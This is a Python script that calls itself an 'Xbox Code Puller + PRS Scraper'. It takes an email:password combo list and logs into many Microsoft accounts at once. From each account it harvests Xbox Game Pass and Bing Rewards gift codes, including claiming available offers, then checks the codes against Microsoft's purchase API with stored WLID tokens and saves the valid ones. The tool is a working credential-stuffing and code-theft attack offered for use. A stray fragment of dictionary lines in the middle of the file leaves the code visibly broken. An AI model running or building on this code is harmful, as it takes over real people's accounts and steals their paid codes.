import re
import os
import sys
import json
import time
import uuid
import random
import string
import urllib.parse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

INVALID_CHARS = set("AEIOULSO015")
WLID_FILE = "wlids.json"

def is_invalid_code_format(code):
    if not code or len(code) < 5 or " " in code:
        return True
    return any(c in INVALID_CHARS for c in code)

def load_wlids():
    if not os.path.exists(WLID_FILE):
        return []
    try:
        with open(WLID_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return []

MICROSOFT_OAUTH_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0"

CODE_PATTERNS = [
    re.compile(r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b'),
    re.compile(r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b'),
    re.compile(r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b'),
]

EXCLUDE_WORDS = {
    "SWEEPSTAKES", "STATUS", "WINORDER", "CONTEST", "PLAGUE", "REQUIEM",
    "CUSTOM", "BUNDLEORDER", "SURFACE", "PROORDER", "SERIES", "POINTS",
    "DONATION", "CHILDREN", "RESEARCH", "HOSPITALORDE", "EDUCATION",
    "EMPLOYMENTOR", "RIGHTS", "YOUORDER", "SEDSORDER", "ATAORDER",
    "CARDORDER", "MICROSOFT", "PRESENTKORT", "KRORDER", "OFT-PRE",
    "DIGITAL", "COINSORDER", "MOEDAS", "OVERWATCHORD", "MONEDASORDER",
    "ASSINATURA", "GRATUITA", "SPOTIFY", "PREMIUM", "MESESORDER",
    "PRESENTE", "RESALET", "NOURORDER", "FOUNDATIONOR", "YACOUB",
    "LEAGUE", "LEGENDS", "RPORDER", "OVERWATCH", "GAME", "PASS",
    "MINECOINS", "ROBUX", "GIFT", "CARD", "ORDER", "CODE", "FOUND",
    "DIGITAL-CODE", "REDEMPTION", "REDEEM", "DOWNLOAD", "INSTANT",
    "DELIVERY", "ONLINE", "ACCESS", "CONTENT", "DLC", "EXPANSION",
    "SEASON", "TOKEN", "CURRENCY", "VIRTUAL", "ITEM",
}


class CookieSession:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": UA})

    def get(self, url, extra_headers=None, max_redirects=10):
        headers = dict(self.session.headers)
        if extra_headers:
            headers.update(extra_headers)
        current_url = url
        r = None
        for _ in range(max_redirects):
            r = self.session.get(current_url, headers=headers, allow_redirects=False, timeout=20)
            if 300 <= r.status_code < 400:
                loc = r.headers.get("Location")
                if not loc:
                    break
                current_url = urllib.parse.urljoin(current_url, loc)
                continue
            break
        return {"res": r, "text": r.text if r else "", "url": current_url}

    def post(self, url, body, extra_headers=None, max_redirects=10):
        headers = dict(self.session.headers)
        if extra_headers:
            headers.update(extra_headers)
        current_url = url
        method = "POST"
        current_body = body
        r = None
        for _ in range(max_redirects):
            if method == "POST":
                r = self.session.post(current_url, data=current_body, headers=headers, allow_redirects=False, timeout=20)
            else:
                r = self.session.get(current_url, headers=headers, allow_redirects=False, timeout=20)
            if 300 <= r.status_code < 400:
                loc = r.headers.get("Location")
                if not loc:
                    break
                current_url = urllib.parse.urljoin(current_url, loc)
                method = "GET"
                current_body = None
                continue
            break
        return {"res": r, "text": r.text if r else "", "url": current_url}


def fetch_oauth_tokens(session):
    try:
        result = session.get(MICROSOFT_OAUTH_URL, extra_headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        })
        text = result["text"]
        ppft = None
        for pat in [r'value=\\"(.+?)\\"', r'value="(.+?)"']:
            m = re.search(pat, text, re.DOTALL)
            if m:
                ppft = m.group(1)
                break
        url_post = None
        for pat in [r'"urlPost":"(.+?)"', r"urlPost:'(.+?)'", r'urlPost:"(.+?)"']:
            m = re.search(pat, text, re.DOTALL)
            if m:
                url_post = m.group(1).replace("&amp;", "&")
                break
        return url_post, ppft
    except Exception:
        return None, None


def fetch_login(session, email, password, url_post, ppft):
    try:
        body = urllib.parse.urlencode({
            "login": email, "loginfmt": email, "passwd": password, "PPFT": ppft
        })
        result = session.post(url_post, body, extra_headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        })
        text = result["text"]
        final_url = result["url"]

        if "#" in final_url and final_url != MICROSOFT_OAUTH_URL:
            fragment = final_url.split("#", 1)[1]
            params = urllib.parse.parse_qs(fragment)
            token = params.get("access_token", [None])[0]
            if token and token != "None":
                return token, "ok"

        if "cancel?mkt=" in text:
            ipt = re.search(r'"ipt" value="([^"]+)"', text)
            pprid = re.search(r'"pprid" value="([^"]+)"', text)
            uaid = re.search(r'"uaid" value="([^"]+)"', text)
            action = re.search(r'id="fmHF" action="([^"]+)"', text)
            if ipt and pprid and uaid and action:
                form_body = urllib.parse.urlencode({
                    "ipt": ipt.group(1), "pprid": pprid.group(1), "uaid": uaid.group(1)
                })
                ret = session.post(action.group(1), form_body, extra_headers={
                    "Content-Type": "application/x-www-form-urlencoded"
                })
                ret_url_match = re.search(r'"recoveryCancel":\{"returnUrl":"([^"]+)"', ret["text"])
                if ret_url_match:
                    fin = session.get(ret_url_match.group(1))
                    fin_url = fin["url"]
                    if "#" in fin_url:
                        fragment = fin_url.split("#", 1)[1]
                        params = urllib.parse.parse_qs(fragment)
                        token = params.get("access_token", [None])[0]
                        if token and token != "None":
                            return token, "ok"

        lower = text.lower()
        if any(v in text for v in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
            return None, "2fa"
        if any(v in lower for v in ["password is incorrect", "account doesn't exist", "that microsoft account doesn't exist",
                                     "sign in to your microsoft account", "tried to sign in too many times", "help us protect your account"]):
            return None, "invalid"
        return None, "error"
    except Exception:
        return None, "error"


def get_xbox_tokens(rps_token):
    try:
        r = requests.post("https://user.auth.xboxlive.com/user/authenticate",
                          json={"RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT",
                                "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": rps_token}},
                          headers={"Content-Type": "application/json"}, timeout=15)
        if r.status_code != 200:
            return None, None
        user_token = r.json()["Token"]
        r2 = requests.post("https://xsts.auth.xboxlive.com/xsts/authorize",
                           json={"RelyingParty": "http://xboxlive.com", "TokenType": "JWT",
                                 "Properties": {"UserTokens": [user_token], "SandboxId": "RETAIL"}},
                           headers={"Content-Type": "application/json"}, timeout=15)
        if r2.status_code != 200:
            return None, None
        xsts = r2.json()
        uhs = xsts.get("DisplayClaims", {}).get("xui", [{}])[0].get("uhs")
        return uhs, xsts["Token"]
    except Exception:
        return None, None


def is_link(resource):
    return resource and (resource.startswith("http://") or resource.startswith("https://"))


def fetch_codes_from_xbox(uhs, xsts_token):
    try:
        auth = f"XBL3.0 x={uhs};{xsts_token}"
        r = requests.get("https://profile.gamepass.com/v2/offers",
                         headers={"Authorization": auth, "Content-Type": "application/json", "User-Agent": "okhttp/4.12.0"},
                         timeout=15)
        if r.status_code != 200:
            return [], []
        data = r.json()
        codes, links = [], []
        for offer in data.get("offers", []):
            if offer.get("resource"):
                if is_link(offer["resource"]):
                    links.append(offer["resource"])
                else:
                    codes.append(offer["resource"])
            elif offer.get("offerStatus") == "available":
                chars = string.ascii_letters + string.digits
                cv = "".join(random.choice(chars) for _ in range(22)) + ".0"
                try:
                    cr = requests.post(f"https://profile.gamepass.com/v2/offers/{offer['offerId']}",
                                       headers={"Authorization": auth, "Content-Type": "application/json",
                                                 "User-Agent": "okhttp/4.12.0", "ms-cv": cv, "Content-Length": "0"},
                                       data="", timeout=15)
                    if cr.status_code == 200:
                        cd = cr.json()
                        if cd.get("resource"):
                            if is_link(cd["resource"]):
                                links.append(cd["resource"])
                            else:
                                codes.append(cd["resource"])
                except Exception:
                    pass
        return codes, links
    except Exception:
        return [], []


def fetch_from_account(email, password):
    try:
        session = CookieSession()
        url_post, ppft = fetch_oauth_tokens(session)
        if not url_post:
            return {"email": email, "codes": [], "links": [], "error": "OAuth failed"}
        rps, status = fetch_login(session, email, password, url_post, ppft)
        if not rps:
            return {"email": email, "codes": [], "links": [], "error": f"Login failed ({status})"}
        uhs, xsts = get_xbox_tokens(rps)
        if not uhs:
            return {"email": email, "codes": [], "links": [], "error": "Xbox tokens failed"}
        codes, links = fetch_codes_from_xbox(uhs, xsts)
        return {"email": email, "codes": codes, "links": links}
    except Exception as ex:
        return {"email": email, "codes": [], "links": [], "error": str(ex)}


def strip_tags(html):
    return re.sub(r'<[^>]*>', '', html).strip()


def extract_table_rows(html):
    rows = []
    for tr_match in re.finditer(r'<tr[^>]*>([\s\S]*?)</tr>', html, re.IGNORECASE):
        row_html = tr_match.group(0)
        cells = []
        for cell_match in re.finditer(r'<t[dh][^>]*>([\s\S]*?)</t[dh]>', row_html, re.IGNORECASE):
            cells.append({"html": cell_match.group(1), "text": strip_tags(cell_match.group(1))})
        if len(cells) >= 3:
            rows.append({"html": row_html, "cells": cells, "text": strip_tags(row_html)})
    return rows


def extract_codes_from_text(text):
    codes = []
    upper = text.upper()
    for pattern in CODE_PATTERNS:
        for m in pattern.finditer(upper):
            code = m.group(0)
            if "*" in code:
                continue
            if code in EXCLUDE_WORDS:
                continue
            alnum = len(code.replace("-", ""))
            if alnum < 12:
                continue
            parts = code.split("-")
            if len(parts) < 3:
                continue
            if code not in codes:
                codes.append(code)
    return codes


def scrape_z_codes_from_rewards(session):
    codes = []
    seen = set()

    try:
        resp = session.get("https://rewards.bing.com/redeem/orderhistory", extra_headers={
            "Referer": "https://rewards.bing.com/",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        })
        text = resp["text"]

        if "fmHF" in text or "JavaScript required to sign in" in text:
            form_action_match = re.search(r'<form[^>]*(?:id="fmHF"|name="fmHF")[^>]*action="([^"]+)"', text)
            if form_action_match:
                action = form_action_match.group(1)
                if action.startswith("/"):
                    action = "https://login.live.com" + action
                inputs = re.findall(r'<input[^>]*name="([^"]*)"[^>]*value="([^"]*)"[^>]*>', text)
                form_data = urllib.parse.urlencode(dict(inputs))
                session.post(action, form_data, extra_headers={"Content-Type": "application/x-www-form-urlencoded"})
                resp = session.get("https://rewards.bing.com/redeem/orderhistory", extra_headers={
                    "Referer": "https://rewards.bing.com/",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                })
                text = resp["text"]

        verification_token = ""
        token_match = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]*)"', text)
        if token_match:
            verification_token = token_match.group(1)

        rows = extract_table_rows(text)

        for row in rows:
            get_code_match = re.search(r'id="OrderDetails_[^"]*"[^>]*data-actionurl="([^"]*)"', row["html"])

            if get_code_match:
                action_url = get_code_match.group(1).replace("&amp;", "&")
                if action_url.startswith("/"):
                    action_url = "https://rewards.bing.com" + action_url
                try:
                    post_data = ""
                    if verification_token:
                        post_data = urllib.parse.urlencode({"__RequestVerificationToken": verification_token})
                    code_resp = session.post(action_url, post_data, extra_headers={
                        "X-Requested-With": "XMLHttpRequest",
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    })
                    code_html = code_resp["text"]
                    code = _extract_single_code(code_html)
                    if code and code.upper().endswith("Z") and code not in seen:
                        seen.add(code)
                        codes.append(code)
                except Exception:
                    pass

            elif "ResendEmail_" not in row["html"]:
                code_cell = row["cells"][3]["text"] if len(row["cells"]) > 3 else row["cells"][2]["text"] if len(row["cells"]) > 2 else ""
                found = extract_codes_from_text(code_cell)
                for c in found:
                    if c.upper().endswith("Z") and c not in seen:
                        seen.add(c)
                        codes.append(c)

        if not rows:
            all_found = extract_codes_from_text(text)
            for c in all_found:
                if c.upper().endswith("Z") and c not in seen:
                    seen.add(c)
                    codes.append(c)
    except Exception:
        pass

    return codes


def _extract_single_code(code_html):
    keys = []
    vals = []
    for km in re.finditer(r"<div[^>]*class=['\"]tango-credential-key['\"][^>]*>([\s\S]*?)</div>", code_html, re.IGNORECASE):
        keys.append(strip_tags(km.group(1)).upper())
    for vm in re.finditer(r"<div[^>]*class=['\"]tango-credential-value['\"][^>]*>([\s\S]*?)</div>", code_html, re.IGNORECASE):
        vals.append(strip_tags(vm.group(1)))
    for i in range(len(keys)):
        if ("CODE" in keys[i] or "PIN" in keys[i]) and i < len(vals) and vals[i] and "*" not in vals[i]:
            return vals[i]
    pin_match = re.search(r'PIN\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})', code_html, re.IGNORECASE)
    if pin_match and "*" not in pin_match.group(1):
        return pin_match.group(1)
    code_match = re.search(r'CODE\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})', code_html, re.IGNORECASE)
    if code_match and "*" not in code_match.group(1):
        return code_match.group(1)
    clip_match = re.search(r'data-clipboard-text="([^"]+)"', code_html)
    if clip_match and len(clip_match.group(1).strip()) >= 15 and "*" not in clip_match.group(1):
        return clip_match.group(1).strip()
    extracted = extract_codes_from_text(code_html)
    return extracted[0] if extracted else None
                        "code": code,
                        "info": "CODE FOUND",
                        "category": "Unknown",
                        "date": time.strftime("%Y-%m-%dT%H:%M:%S"),
                        "redemptionUrl": "",


def check_single_code(code, wlid):
    trimmed = code.strip()
    if not trimmed or len(trimmed) < 18:
        return {"code": trimmed, "status": "invalid"}
    retry_count = 0
    while retry_count < 3:
        try:
            r = requests.get(
                f"https://purchase.mp.microsoft.com/v7.0/tokenDescriptions/{trimmed}?market=US&language=en-US&supportMultiAvailabilities=true",
                headers={
                    "Authorization": wlid,
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "Origin": "https://www.microsoft.com",
                    "Referer": "https://www.microsoft.com/",
                },
                timeout=30,
            )
            if r.status_code == 429:
                time.sleep(5)
                retry_count += 1
                continue
            data = r.json()
            title = "N/A"
            if data.get("products") and len(data["products"]) > 0:
                product = data["products"][0]
                title = (product.get("sku") or {}).get("title") or product.get("title", "N/A")
                if title == "N/A":
                    lp = (product.get("localizedProperties") or [{}])
                    if lp:
                        title = lp[0].get("productTitle", "N/A")
            elif data.get("universalStoreBigIds") and len(data["universalStoreBigIds"]) > 0:
                parts = data["universalStoreBigIds"][0].split("/")
                product_id = parts[0]
                sku_id = parts[1] if len(parts) > 1 else ""
                try:
                    cat_r = requests.get(
                        f"https://displaycatalog.mp.microsoft.com/v7.0/products?bigIds={product_id}&market=US&languages=en-US",
                        timeout=15,
                    )
                    if cat_r.status_code == 200:
                        cat_data = cat_r.json()
                        if cat_data.get("Products") and len(cat_data["Products"]) > 0:
                            p = cat_data["Products"][0]
                            if p.get("DisplaySkuAvailabilities"):
                                for s in p["DisplaySkuAvailabilities"]:
                                    if s.get("Sku", {}).get("SkuId") == sku_id:
                                        lp = (s.get("Sku", {}).get("LocalizedProperties") or [{}])
                                        if lp:
                                            title = lp[0].get("SkuTitle") or lp[0].get("SkuDescription", "N/A")
                                        break
                            if title == "N/A" and p.get("LocalizedProperties"):
                                title = p["LocalizedProperties"][0].get("ProductTitle", "N/A")
                except Exception:
                    title = f"ID: {product_id}"
            clean_title = (title or "N/A").strip()
            if data.get("tokenState") == "Active":
                return {"code": trimmed, "status": "valid", "title": clean_title}
            if data.get("tokenState") == "Redeemed":
                return {"code": trimmed, "status": "used", "title": clean_title}
            if data.get("tokenState") == "Expired":
                return {"code": trimmed, "status": "expired", "title": clean_title}
            if data.get("code") == "NotFound":
                return {"code": trimmed, "status": "invalid"}
            if data.get("code") == "Unauthorized":
                return {"code": trimmed, "status": "error", "error": "WLID unauthorized"}
            return {"code": trimmed, "status": "invalid"}
        except Exception as ex:
            retry_count += 1
            if retry_count >= 3:
                return {"code": trimmed, "status": "error", "error": str(ex)}
            time.sleep(1)
    return {"code": trimmed, "status": "error", "error": "Max retries exceeded"}


def check_codes(wlids, codes, threads=10, on_progress=None, stop_event=None):
    formatted = []
    for w in wlids:
        w = w.strip()
        if "WLID1.0=" in w:
            formatted.append(w)
        else:
            formatted.append(f'WLID1.0="{w}"')
    MAX_PER_WLID = 40
    tasks = []
    for i, code in enumerate(codes):
        code = code.strip()
        if not code:
            continue
        wlid_index = i // MAX_PER_WLID
        if wlid_index >= len(formatted):
            break
        tasks.append((code, formatted[wlid_index]))

    results = []
    done = [0]
    lock = threading.Lock()
    task_idx = [0]

    def worker():
        while True:
            if stop_event and stop_event.is_set():
                break
            with lock:
                idx = task_idx[0]
                task_idx[0] += 1
            if idx >= len(tasks):
                break
            code, wlid = tasks[idx]
            result = check_single_code(code, wlid)
            with lock:
                results.append(result)
                done[0] += 1
            if on_progress and done[0] % 10 == 0:
                on_progress(done[0], len(tasks), result)

    concurrency = min(threads, len(tasks), 100)
    workers = []
    for _ in range(concurrency):
        t = threading.Thread(target=worker)
        t.start()
        workers.append(t)
    for t in workers:
        t.join()
    return results


def pull_codes(accounts, stop_event=None):
    parsed = []
    for a in accounts:
        i = a.find(":")
        if i == -1:
            parsed.append((a, ""))
        else:
            parsed.append((a[:i], a[i + 1:]))

    threads = min(len(parsed), 10)
    all_codes = []
    fetch_results = []
    lock = threading.Lock()
    fetch_idx = [0]

    def fetch_worker():
        while True:
            if stop_event and stop_event.is_set():
                break
            with lock:
                idx = fetch_idx[0]
                fetch_idx[0] += 1
            if idx >= len(parsed):
                break
            email, password = parsed[idx]

            gp_result = fetch_from_account(email, password)
            prs_session = CookieSession()
            prs_url_post, prs_ppft = fetch_oauth_tokens(prs_session)
            prs_z_codes = []
            if prs_url_post and prs_ppft:
                prs_token, prs_status = fetch_login(prs_session, email, password, prs_url_post, prs_ppft)
                if prs_token:
                    prs_z_codes = scrape_z_codes_from_rewards(prs_session)

            gp_codes = gp_result.get("codes", [])
            gp_code_set = set(gp_codes)
            prs_codes = [c for c in prs_z_codes if c not in gp_code_set]

            merged_codes = gp_codes + prs_codes

            with lock:
                fetch_results.append({"email": email, "codes": merged_codes, "error": gp_result.get("error")})
                all_codes.extend(merged_codes)

            status = "✓" if merged_codes else ("✗ " + (gp_result.get("error") or "no codes")) if not merged_codes else "✓"
            print(f"  [{len(fetch_results)}/{len(parsed)}] {email} → {len(merged_codes)} codes {status}")

    worker_count = min(threads, len(parsed))
    workers = []
    for _ in range(worker_count):
        t = threading.Thread(target=fetch_worker)
        t.start()
        workers.append(t)
    for t in workers:
        t.join()

    if (stop_event and stop_event.is_set()) or not all_codes:
        return {"fetch_results": fetch_results, "validate_results": []}

    wlids = load_wlids()
    if not wlids:
        print("\n  ⚠ No WLIDs found. Save WLIDs to wlids.json first.")
        validate_results = [{"code": c, "status": "error", "message": f"{c} | No WLIDs stored"} for c in all_codes]
        return {"fetch_results": fetch_results, "validate_results": validate_results}

    print(f"\n  Validating {len(all_codes)} codes with {len(wlids)} WLIDs...")

    validate_results = check_codes(wlids, all_codes, 10, lambda done, total, last: (
        print(f"  [{done}/{total}] {last.get('status', '?').upper()}" + (f" → {last.get('title', '')}" if last.get("title") else ""))
    ), stop_event)

    return {"fetch_results": fetch_results, "validate_results": validate_results}


def main():
    print()
    print("  ╔══════════════════════════════════════╗")
    print("  ║     Xbox Code Puller + PRS Scraper   ║")
    print("  ║          made by talkneon            ║")
    print("  ╚══════════════════════════════════════╝")
    print()

    if len(sys.argv) > 1:
        combo_file = sys.argv[1]
    else:
        combo_file = input("  Enter combo file path (email:pass per line): ").strip()
        if not combo_file:
            combo_file = "combos.txt"

    if not os.path.exists(combo_file):
        print(f"  ✗ File not found: {combo_file}")
        return

    with open(combo_file, "r") as f:
        accounts = [line.strip() for line in f if ":" in line.strip()]

    if not accounts:
        print("  ✗ No valid accounts found in file.")
        return

    print(f"  Loaded {len(accounts)} accounts")
    print()

    stop_event = threading.Event()
    result = pull_codes(accounts, stop_event)

    fetch_results = result["fetch_results"]
    validate_results = result["validate_results"]

    total_codes = sum(len(r.get("codes", [])) for r in fetch_results)
    total_errors = sum(1 for r in fetch_results if r.get("error"))

    print()
    print("  ═══════════════════════════════════════")
    print(f"  Accounts: {len(accounts)} | Codes Found: {total_codes} | Errors: {total_errors}")
    print("  ═══════════════════════════════════════")

    if validate_results:
        valid = [r for r in validate_results if r.get("status") == "valid"]
        used = [r for r in validate_results if r.get("status") == "used"]
        expired = [r for r in validate_results if r.get("status") == "expired"]
        invalid = [r for r in validate_results if r.get("status") == "invalid"]
        errors = [r for r in validate_results if r.get("status") == "error"]

        print(f"\n  Valid: {len(valid)} | Used: {len(used)} | Expired: {len(expired)} | Invalid: {len(invalid)} | Errors: {len(errors)}")

        if valid:
            print("\n  ── Valid Codes ──")
            os.makedirs("results", exist_ok=True)
            with open("results/valid.txt", "w") as f:
                for r in valid:
                    line = f"  {r['code']} | {r.get('title', 'N/A')}"
                    print(line)
                    f.write(f"{r['code']} | {r.get('title', 'N/A')}\n")
            print(f"\n  Saved to results/valid.txt")

        if used:
            os.makedirs("results", exist_ok=True)
            with open("results/used.txt", "w") as f:
                for r in used:
                    f.write(f"{r['code']} | {r.get('title', 'N/A')}\n")

        if expired:
            os.makedirs("results", exist_ok=True)
            with open("results/expired.txt", "w") as f:
                for r in expired:
                    f.write(f"{r['code']} | {r.get('title', 'N/A')}\n")

    print()


if __name__ == "__main__":
    main()
